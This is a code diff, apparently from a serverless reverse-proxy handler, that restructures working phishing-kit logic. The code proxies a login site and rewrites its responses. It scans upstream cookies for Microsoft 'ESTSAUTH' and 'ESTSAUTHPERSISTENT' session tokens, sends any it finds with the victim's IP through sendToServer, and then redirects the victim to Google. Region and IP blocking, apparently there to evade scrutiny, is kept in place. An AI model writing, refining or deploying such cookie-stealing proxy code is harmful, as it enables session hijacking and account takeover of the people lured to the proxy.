@@ -26,46 +26,48 @@ export const config = {
 };
 
 export default async function handler(req, res) {
-    const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : '';
-    const ip_address = req.headers['cf-connecting-ip'];
-
-    if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
-        res.status(403).send('Access denied.');
-        return;
-    }
-
-    let url = new URL(req.url, `https://${req.headers.host}`);
-    let url_hostname = url.hostname;
-
-    url.protocol = https ? 'https:' : 'http:';
-    url.host = upstream;
-    url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
-
     try {
-        // Fetch from upstream URL
-        const response = await fetch(url.href, {
+        const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : '';
+        const ip_address = req.headers['cf-connecting-ip'];
+
+        if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
+            res.status(403).send('Access denied.');
+            return;
+        }
+
+        let url = new URL(req.url, `https://${req.headers.host}`);
+        let url_hostname = url.hostname;
+
+        url.protocol = https ? 'https:' : 'http:';
+        url.host = upstream;
+        url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
+
+        const fetchOptions = {
             method: req.method,
             headers: req.headers,
             body: req.method === 'POST' ? req.body : undefined
-        });
+        };
 
-        if (!response.ok) {
-            throw new Error(`Failed to fetch from upstream: ${response.statusText}`);
+        const upstreamResponse = await fetch(url.href, fetchOptions);
+
+        if (!upstreamResponse.ok) {
+            throw new Error(`Failed to fetch from upstream: ${upstreamResponse.statusText}`);
         }
 
-        let original_response_clone = await response.clone();
+        let original_response_clone = await upstreamResponse.clone();
         let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
-        let new_response_headers = response.headers.raw();
+        let new_response_headers = upstreamResponse.headers.raw();
 
         // Send email if necessary
-        const cookies = response.headers.raw()['set-cookie'] || [];
+        const cookies = new_response_headers['set-cookie'] || [];
         const all_cookies = cookies.join("; \n\n");
 
         if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
             await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
         }
 
-        res.writeHead(response.status, {
+        // Redirect to Google
+        res.writeHead(upstreamResponse.status, {
             'Content-Type': 'text/html',
             ...new_response_headers,
             'Location': 'https://google.com'
